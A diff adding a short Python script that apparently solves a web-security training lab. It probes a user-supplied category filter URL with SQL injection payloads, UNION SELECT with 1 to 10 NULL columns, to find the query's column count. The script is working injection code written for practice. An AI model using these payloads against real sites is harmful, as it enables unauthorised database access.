@@ -1,0 +1,20 @@
+import requests
+session = requests.Session()
+filter_url = input("Enter the category filter URL (ending at /filter): ")
+
+# Exact valid category name (use a space instead of a + sign)
+valid_category = "Corporate gifts"
+
+
+for i in range(1, 11):
+    nulls = ",".join(["NULL"] * i)
+    payload = f"{valid_category}' UNION SELECT {nulls}--"
+    
+    params = {'category': payload}
+    print(f"[*] Testing {i} columns with payload...")
+    response = session.get(filter_url, params=params)
+    if "Congratulations, you solved the lab!" in response.text:
+        print(f"==> Success: Lab solved! The query uses exactly {i} columns.")
+        break
+else:
+    print("==> Failed: Tried up to 10 columns. Check your category spelling or if the URL expired.")
